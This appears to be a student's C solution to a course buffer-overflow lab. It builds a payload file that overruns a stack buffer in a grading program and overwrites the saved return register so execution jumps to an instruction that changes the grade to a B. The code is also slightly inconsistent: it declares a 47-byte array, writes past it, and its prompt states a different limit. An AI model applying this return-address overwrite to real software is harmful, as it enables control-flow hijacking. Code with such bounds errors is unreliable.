/*
Produces a file called dataB with the student name, a nullbyte, padding
to overrun the stack, and the address of the instruction in main to get
a B, the latter of which will overwrite getName's stored x30
*/

#include <stdio.h>

int main(void) {
    char pcName[47];
    char ch = 0;
    int i = 0;
    unsigned long uiTargetAddr = 0x400890;
    FILE *psFile;

    /* get name(s) to use in dataB */
    printf("Enter your name(s) (max 55 chars):\n");
    while ((i < 47)) {
        ch = getchar();
        if (ch == '\n') {
            break;
        }
        pcName[i] = ch;
        i++;
    }
    /* add nullbyte */
    pcName[i++] = '\0';
    /* pad as necessary */
    for (; i < 48; i++) {
        pcName[i] = '0';
    }

    psFile = fopen("dataB", "w");
    /* fill buf */
    fwrite(pcName, sizeof(char), 48, psFile);
    /* overwrite getName's x30 with addr of grade change instruction
    (0x400890) */
    fwrite(&uiTargetAddr, sizeof(unsigned long), 1, psFile);
    fclose(psFile);

    return 0;
}
